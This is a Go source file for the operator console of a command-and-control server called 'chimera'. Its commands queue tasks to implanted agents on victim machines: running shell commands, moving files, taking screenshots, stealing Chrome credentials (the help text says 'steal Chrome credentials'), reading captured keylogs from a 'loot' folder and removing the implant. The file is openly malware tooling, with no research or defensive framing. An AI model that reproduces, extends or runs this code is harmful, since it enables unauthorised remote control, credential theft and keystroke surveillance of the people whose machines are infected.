package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
)

func startCLI() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("chimera> ")
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Print("chimera> ")
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]

		switch cmd {
		case "list":
			fmt.Print(formatAgents())
		case "exec":
			if len(parts) < 3 {
				fmt.Println("usage: exec <agent> <command>")
			} else {
				queueTask(parts[1], Task{Type: "exec", Command: strings.Join(parts[2:], " ")})
				fmt.Printf("[+] queued exec for %s\n", parts[1])
			}
		case "upload":
			if len(parts) < 4 {
				fmt.Println("usage: upload <agent> <local> <remote>")
			} else {
				uploadFile(parts[1], parts[2], parts[3])
			}
		case "download":
			if len(parts) < 4 {
				fmt.Println("usage: download <agent> <remote> <local>")
			} else {
				queueTask(parts[1], Task{Type: "download", Path: parts[2], Destination: parts[3]})
				fmt.Printf("[+] queued download for %s: %s\n", parts[1], parts[2])
			}
		case "screenshot":
			if len(parts) < 2 {
				fmt.Println("usage: screenshot <agent>")
			} else {
				queueTask(parts[1], Task{Type: "screenshot"})
				fmt.Printf("[+] queued screenshot for %s\n", parts[1])
			}
		case "harvest":
			if len(parts) < 2 {
				fmt.Println("usage: harvest <agent>")
			} else {
				queueTask(parts[1], Task{Type: "harvest"})
				fmt.Printf("[+] queued harvest for %s\n", parts[1])
			}
		case "keylog":
			if len(parts) < 2 {
				fmt.Println("usage: keylog <agent>")
			} else {
				printKeylog(parts[1])
			}
		case "result":
			if len(parts) < 2 {
				fmt.Println("usage: result <agent>")
			} else {
				printResults(parts[1])
			}
		case "uninstall":
			if len(parts) < 2 {
				fmt.Println("usage: uninstall <agent>")
			} else {
				queueTask(parts[1], Task{Type: "uninstall"})
				fmt.Printf("[+] queued uninstall for %s\n", parts[1])
			}
		case "help":
			fmt.Println(`commands:
  list                          list all agents
  exec <agent> <cmd>            run shell command
  upload <agent> <local> <rmt>  upload file to agent
  download <agent> <rmt> <loc>  download file from agent
  screenshot <agent>            capture screen
  harvest <agent>               steal Chrome credentials
  keylog <agent>                view keylogs
  result <agent>                view last results
  uninstall <agent>             remove implant
  exit                          quit`)
		case "exit":
			fmt.Println("bye")
			os.Exit(0)
		default:
			fmt.Printf("unknown command: %s (type 'help')\n", cmd)
		}
		fmt.Print("chimera> ")
	}

	if err := scanner.Err(); err != nil {
		log.Printf("[cli] scanner error: %v", err)
	}
}

func uploadFile(agentID, localPath, remotePath string) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("[-] read error: %v\n", err)
		return
	}

	queueTask(agentID, Task{
		Type:        "upload",
		FileData:    base64.StdEncoding.EncodeToString(data),
		Destination: remotePath,
	})
	fmt.Printf("[+] queued upload for %s: %s -> %s (%d bytes)\n", agentID, localPath, remotePath, len(data))
}

func printKeylog(agentID string) {
	path := filepath.Join("loot", agentID, "keylogs.txt")
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Printf("[-] no keylogs for %s\n", agentID)
		return
	}
	fmt.Println(string(data))
}

func printResults(agentID string) {
	results := getResults(agentID)
	if len(results) == 0 {
		fmt.Printf("[-] no results for %s\n", agentID)
		return
	}
	for i, r := range results {
		fmt.Printf("--- result %d ---\n", i+1)
		fmt.Printf("  type: %s\n", r.Type)
		if r.Filename != "" {
			fmt.Printf("  file: %s\n", r.Filename)
		}
		if r.Data != "" {
			fmt.Printf("  data: %s\n", r.Data)
		}
		if r.Keylogs != "" {
			fmt.Printf("  keylogs: %s\n", r.Keylogs)
		}
		if len(r.Errors) > 0 {
			fmt.Printf("  errors: %v\n", r.Errors)
		}
	}
}
